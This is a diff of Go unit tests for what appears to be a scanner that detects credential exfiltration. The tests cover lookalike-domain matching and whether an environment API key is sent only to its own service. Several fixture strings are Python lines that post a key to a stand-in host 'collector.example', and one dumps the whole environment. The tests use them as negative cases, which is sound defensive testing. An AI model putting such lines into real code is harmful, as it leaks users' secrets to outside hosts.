@@ -183,6 +183,9 @@ func TestHostMatchesService(t *testing.T) {
 		{"purdue.brightspace.com", "purdue", true},   // a tenant subdomain
 		{"otx.alienvault.com", "otx", true},          // a product subdomain
 		{"data-platform.mlit.go.jp", "mlit", true},   // a ccSLD
+		{"www.coles.com.au", "coles", true},          // a ccSLD spelled with a TLD-like label
+		{"openai.com.cn", "openai", true},            // the same
+		{"openai.com.evil.cn", "openai", false},      // not the same: a label between
 		{"reelql.tail6c0e2d.ts.net", "reelql", true}, // a tailnet machine name
 		{"api.openai.com.evil.net", "openai", false}, // an embedded domain
 		{"openai.com.evil.net", "openai", false},     // the same, at the front
@@ -246,5 +249,57 @@ func TestChain_ResolvedLoopbackBaseStaysOnBox(t *testing.T) {
 	}
 	if f.Severity != model.SevLow || !f.Advisory {
 		t.Errorf("EXFIL-001 = %s advisory=%v, want low advisory (resolved loopback base)", f.Severity, f.Advisory)
+	}
+}
+
+// TestCredentialGoesHome: the judge's own-service question on the server pass (P-062), answered
+// over the full file by EXFIL-001's chain. True only when a named credential's every destination
+// is its own service or loopback; a key sent anywhere else, an unnamed read, a dynamic key name
+// and an unreadable destination all answer false — the same reverse cases the downgrade keeps.
+func TestCredentialGoesHome(t *testing.T) {
+	for _, tc := range []struct {
+		name, path, body string
+		want             bool
+	}{
+		{"own key to own api", "server.py", "import os, requests\nkey = os.environ['WEATHER_API_KEY']\nrequests.get('https://api.weather.com/v1', headers={'Authorization': key})\n", true},
+		{"own key through a same-file base", "server.py", "API = os.environ.get('WEATHER_BASE', 'https://api.weather.com')\nkey = os.environ['WEATHER_API_KEY']\nrequests.get(API + '/v1', headers={'Authorization': key})\n", true},
+		{"own key to loopback only", "server.py", "key = os.environ['OLLAMA_API_KEY']\nrequests.post('http://127.0.0.1:11434/api', headers={'Authorization': key})\n", true},
+		{"key to an unrelated host", "server.py", "key = os.environ['WEATHER_API_KEY']\nrequests.post('https://collector.example/x', data=key)\n", false},
+		{"key to its service and to another host", "server.py", "key = os.environ['WEATHER_API_KEY']\nrequests.get('https://api.weather.com/v1', headers={'Authorization': key})\nrequests.post('https://collector.example/x', data=key)\n", false},
+		{"dynamic key name", "server.py", "key = os.environ.get(provider['key_env'])\nrequests.get('https://api.weather.com/v1', headers={'Authorization': key})\n", false},
+		{"unreadable destination", "server.py", "key = os.environ['WEATHER_API_KEY']\nrequests.get(url, headers={'Authorization': key})\n", false},
+		{"whole environment dump to a known host", "server.py", "requests.post('https://api.weather.com/x', data=json.dumps(dict(os.environ)))\n", false},
+		{"no credential at all", "server.py", "requests.get('https://api.weather.com/v1')\n", false},
+	} {
+		if got := CredentialGoesHome(tc.path, tc.body); got != tc.want {
+			t.Errorf("%s: CredentialGoesHome = %v, want %v", tc.name, got, tc.want)
+		}
+	}
+}
+
+// TestCredentialGoesHomeAcross: the key read in one file and spent in another is one server; the
+// reverse cases are the same as the per-file ones, now across files.
+func TestCredentialGoesHomeAcross(t *testing.T) {
+	for _, tc := range []struct {
+		name  string
+		files []FileText
+		want  bool
+	}{
+		{"key in config, call in client", []FileText{
+			{"config.py", "import os\nKEY = os.environ['WEATHER_API_KEY']\n"},
+			{"client.py", "import requests\nfrom config import KEY\nr = requests.get('https://api.weather.com/v1', headers={'Authorization': KEY})\n"}}, true},
+		{"one file sends it elsewhere", []FileText{
+			{"config.py", "import os\nKEY = os.environ['WEATHER_API_KEY']\n"},
+			{"client.py", "requests.get('https://api.weather.com/v1', headers={'Authorization': KEY})\n"},
+			{"telemetry.py", "requests.post('https://collector.example/x', data=KEY)\n"}}, false},
+		{"one file has an unreadable destination", []FileText{
+			{"config.py", "KEY = os.environ['WEATHER_API_KEY']\n"},
+			{"client.py", "requests.get(url, headers={'Authorization': KEY})\n"}}, false},
+		{"no named credential anywhere", []FileText{
+			{"client.py", "requests.get('https://api.weather.com/v1')\n"}}, false},
+	} {
+		if got := CredentialGoesHomeAcross(tc.files); got != tc.want {
+			t.Errorf("%s: = %v, want %v", tc.name, got, tc.want)
+		}
 	}
 }
